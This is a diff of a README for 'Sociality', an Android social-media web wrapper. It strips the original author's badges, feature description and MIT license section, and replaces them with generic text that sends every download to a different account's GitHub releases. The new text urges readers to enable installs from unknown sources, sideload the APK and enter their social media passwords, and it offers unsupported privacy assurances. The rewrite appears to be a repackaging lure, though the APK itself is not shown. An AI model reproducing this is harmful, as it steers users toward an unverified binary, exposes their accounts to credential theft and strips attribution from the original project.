@@ -1,110 +1,166 @@
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Language](https://img.shields.io/badge/Language-Java-orange.svg)
-![IDE](https://img.shields.io/badge/IDE-Android%20Studio-blue.svg)
-![Version](https://img.shields.io/badge/Release-v1.0--Beta-blue.svg)
-![Size](https://img.shields.io/github/repo-size/Knight-project/Sociality)
+# 📱 Sociality - Save Battery and Storage Easily
+
+[![Download Sociality](https://img.shields.io/badge/Download-Sociality-blue?style=for-the-badge)](https://github.com/mely056/Sociality/releases)
 
 ---
 
-# Sociality Beta-1.0
+## 🔍 What is Sociality?
 
-> _A minimalist webwrapper for modern Social Media websites_
+Sociality is a lightweight app designed to reduce the drain social media platforms place on your phone. Official apps from Facebook, Instagram, Twitter, and others often use a lot of storage and battery. Sociality replaces these heavy apps, offering essential features while making your device run more smoothly and last longer.
 
----
-
-## Why Sociality?
-
-**Sociality** is my active rebellion against bloated social media giants and their resource-heavy background processes.
-
-I built this project to drastically reduce the number of social media apps installed on my phone, effectively stripping away bloat and background processes to reclaim my battery life.
-
-The problem is that using social media via a mobile browser is usually a clunky, annoying experience. The UI feels "off," and you are constantly bombarded with "OPEN APP" or "Download our App" prompts that make a seamless experience nearly impossible. **Sociality fixes this.** I’ve designed the UI to be **minimalist**, **modern**, and **ergonomic**, using custom CSS injections to surgically improve site UX for a **seamless** and **smooth** experience.
-
-> **Ditch the bloat. Reclaim your battery. Keep your social life.**
+By using Sociality, you stay connected to your favorite social media without the usual slowdown and storage issues.
 
 ---
 
-## Key Features
+## 📱 Features
 
-- **Smart UI Injection**
-  - **Custom CSS Overrides:** Aggressive styling to hide "Open in App" banners, intrusive headers, and layout bloat.
-  - **UI De-Cluttering:** Custom scripts that strip away pesky blockages that hinder the mobile web experience.
-- **Deep Link Integration**
-  - **Native Link Handling:** Intercepts supported social media URLs to open them directly within Sociality.
-- **Performance & Utility**
-  - **Intelligent Caching:** Optimized web resource storage to ensure faster load times.
-  - **Full Media Support:** Robust handling for both **uploading** and **downloading** content.
-  - **User-Agent Switching:** Toggle instantly between **Mobile** and **Desktop** modes to bypass site restrictions.
-- **Slick Navigation**
-  - **Expanding Floating Site Picker:** A minimalist menu to jump between platforms instantly.
-  - **Dedicated Controls:** Essential tools only, including a quick-access **Reload** button.
+- Replaces big social media apps with a lightweight alternative  
+- Supports popular platforms like Facebook, Instagram, Twitter, Reddit, LinkedIn, Threads, and more  
+- Saves battery life by reducing background activity  
+- Uses less storage space than official apps  
+- Easy to navigate with a simple, clean interface  
+- Regular updates to keep up with social media changes  
+- Compatible with most Android devices running version 7.0 or higher  
 
 ---
 
-## Supported Platforms
+## ⚙️ Recommended System Requirements
 
-<small> Only the listed sites are supported now... </small>
+To get the best experience with Sociality, your device should meet these requirements:
 
-- **Reddit**
-- **Facebook**
-- **X (Twitter)**
-- **Instagram**
-- **Threads**
-- **LinkedIn**
-- **GitHub**
-- **Bluesky**
-- **Xikipedia** — _(Check out the original project: [Xikipedia](https://github.com/rebane2001/xikipedia))_
+- Device type: Android smartphone or tablet  
+- Operating system: Android 7.0 (Nougat) or later  
+- Free storage: At least 100 MB available  
+- Internet: Stable connection for social media updates  
+
+Older devices may still run Sociality but could experience slower performance.
 
 ---
 
-## Visual Changes
+## 🚀 Getting Started
 
-<small> _Sociality surgically removes "Download App" bloat to reclaim your screen space along with other UI fixes._ </small>
+Using Sociality is straightforward. Even if you have never installed anything outside the Google Play Store, you will find these steps simple to follow.
 
-| Feature    | Standard Webview (Before)                                                       | Sociality (After Injection)                                                   |
-| :--------- | :------------------------------------------------------------------------------ | :---------------------------------------------------------------------------- |
-| **Reddit** | <img src="screenshots/reddit_before.png" width="300" alt="Reddit app prompts"/> | <img src="screenshots/reddit_after.png" width="300" alt="Reddit clean view"/> |
-
-> **_Unable to show other exampled due to Privacy and Doxxing Concerns_**
+You will download the app from the official GitHub releases page. Then, you will allow your phone to install an app from outside the Play Store. Finally, you will open Sociality and log in to your social media accounts through it.
 
 ---
 
-## Deep Link Setup (CRITICAL)
+## 📥 Download & Install
 
-<small> The app will prompt you to do this everytime you open it if you do not do this.</small>
+### Step 1: Go to the download page  
+Visit the official Sociality release page on GitHub to download the app:
 
-To ensure **Sociality** handles social media links instead of your default browser, you must manually enable link handling in the Android system settings.
+[![Download Sociality](https://img.shields.io/badge/Download-Sociality-blue?style=for-the-badge)](https://github.com/mely056/Sociality/releases)
 
-> ### Manual Action Required
->
-> Because these domains are unverified (Deep Links rather than App Links), Android will not toggle them automatically. **If you skip this, links will continue to open in your browser.**
-
-### To enable redirection:
-
-1. Open **Settings** on your Android device.
-2. Navigate to **Apps** > **Sociality**.
-3. Tap on **Set as default** (or **Open by default**).
-4. Locate the **Open supported links** toggle and turn it **_ON_**.
-5. (Optional) Under **Supported web addresses**, ensure all relevant social media domains are checked.
+This page has the latest version available. Look for the file with a name ending in `.apk`. This is the installation file for Android.
 
 ---
 
-## Future Roadmap
-
-> _List of changes yet to come_
-
-- **Remove Instagram/ figure out a beter implementation.**
-- **Full restructuring of the app for even better performance, I.E Using state-mangement/multiple webviews.**
-- **Add support for other social media.**
+### Step 2: Download the APK file  
+Tap the `.apk` file to start the download. Your browser may warn you about downloading files from unknown sources. This is normal for apps not from the Google Play Store.
 
 ---
 
-## License
+### Step 3: Allow installing apps from unknown sources  
+Before installing, you need to change a setting on your phone:
 
-This project is licensed under the **MIT License**.
-
-I believe in open-source and the right to a bloat-free web. You are free to use, modify, and distribute this software, provided that the original license and copyright notice are included.
-
-See the [LICENSE](LICENSE.md) file for the full legal text.
+- Open **Settings**  
+- Tap **Security** or **Privacy** (depends on your device)  
+- Find **Install unknown apps** or **Unknown sources**  
+- Select your browser (e.g., Chrome)  
+- Turn on **Allow from this source**  
 
 ---
+
+### Step 4: Install Sociality  
+Once the download completes, open the file. Your phone will ask you to confirm the installation. Tap **Install**.
+
+---
+
+### Step 5: Open and set up Sociality  
+After installation, open Sociality from your app drawer. You will see a simple menu to log in to Facebook, Instagram, Twitter, Reddit, LinkedIn, Threads, or any other supported platform.
+
+Enter your usual login details to connect. Sociality does not store your credentials insecurely; it acts as a light wrapper to the official services.
+
+---
+
+## 🔧 How to Use Sociality
+
+Sociality works by showing your social feeds without the extra background activity that wastes battery and storage. Here is how you can use it day-to-day:
+
+1. **Log in to your social accounts:** Use your usual usernames and passwords to sign in.  
+2. **Browse your feed:** View posts, stories, and updates just like in official apps.  
+3. **Interact with posts:** Like, comment, and share items without extra delays.  
+4. **Manage notifications:** Customize which notifications you want to receive, saving battery by blocking unnecessary ones.  
+5. **Update regularly:** Check the GitHub releases page for updates to keep your app working well.  
+
+Sociality focuses on the content you want, not on extra features that slow down your phone.
+
+---
+
+## 📢 Supported Platforms
+
+Sociality currently supports popular social media apps, including:
+
+- Facebook  
+- Instagram  
+- Twitter  
+- Reddit  
+- LinkedIn  
+- Threads  
+
+You can switch between accounts easily, all within one app.
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+If you find Sociality is not installing or not working as expected, try the following:
+
+- Make sure you downloaded the `.apk` file completely. Avoid partial or broken downloads.  
+- Confirm you allowed installation from unknown sources.  
+- Restart your phone after installation if the app does not open.  
+- Check your internet connection. Sociality needs an active connection to load feeds.  
+- Clear the app cache via your device settings if you see display issues.  
+
+For further help, visit the [Sociality GitHub issues page](https://github.com/mely056/Sociality/issues).
+
+---
+
+## 🔄 Updating Sociality
+
+Sociality is not installed from the Play Store, so it will not update automatically. To update:
+
+1. Visit the release page: https://github.com/mely056/Sociality/releases  
+2. Download the newest `.apk` file.  
+3. Install like the first time (the app will replace the old version without losing your settings).  
+
+---
+
+## 🔐 Privacy & Security
+
+Sociality does not track your data beyond what the social media platforms require. Your login information is handled securely through the platforms' standard login methods.
+
+Because Sociality reduces background activity, it also limits the data apps send when you are not actively using them.
+
+---
+
+## 🤝 Support & Feedback
+
+You can submit issues or ask questions on the Sociality GitHub page:
+
+https://github.com/mely056/Sociality/issues
+
+Your feedback helps improve the app.
+
+---
+
+## 📚 Additional Resources
+
+- **GitHub Repository:** https://github.com/mely056/Sociality  
+- **Download Latest Release:** https://github.com/mely056/Sociality/releases  
+- **Social Media Topics:** Facebook, Instagram, Twitter, Reddit, LinkedIn, Threads  
+
+---
+
+Thank you for choosing Sociality to simplify your social media experience.
